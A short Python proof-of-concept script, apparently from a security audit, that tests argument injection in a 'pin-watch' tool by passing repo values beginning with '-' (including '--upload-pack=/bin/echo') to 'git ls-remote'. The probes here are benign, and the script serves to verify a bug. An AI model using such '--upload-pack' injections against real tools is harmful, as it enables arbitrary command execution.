#!/usr/bin/env python3
"""PoC: option injection via repo cell starting with '-' (pin-watch read_tags)."""
import importlib.util, os, subprocess, sys

spec = importlib.util.spec_from_file_location(
    "pinwatch", "/fast/scratch/kama-r41/clone/tools/pin-watch.py")
pw = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pw)

def run(repo):
    # exact call shape from pin-watch.py read_tags (lines 100-102)
    try:
        p = subprocess.run(["git", "ls-remote", "--tags", repo],
                           capture_output=True, text=True, timeout=120,
                           env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
        return p.returncode, p.stdout[:120], p.stderr.strip()[:300]
    except Exception as e:
        return type(e).__name__, "", str(e)[:200]

payloads = [
    "--upload-pack=/tmp/NOPE",
    "--get-url",
    "--refs",
    "--upload-pack=/bin/echo",
    "-h",
    "--unknown-flag",
    "--upload-pack=/bin/echo https://example.invalid/x.git",
]
for r in payloads:
    rc, out, err = run(r)
    print(f"REPO {r!r:45} -> rc={rc} out={out!r} err={err!r}")

# baseline: legitimate local repo path works
tmp = "/tmp/R41B08-dev"
os.system(f"git init -q --bare {tmp}/bare.git 2>/dev/null")
open(f"{tmp}/bare.git/refs/heads/master", "w").close()
rc, out, err = run(f"{tmp}/bare.git")
print(f"REPO local-bare -> rc={rc} out={out!r} err={err!r}")
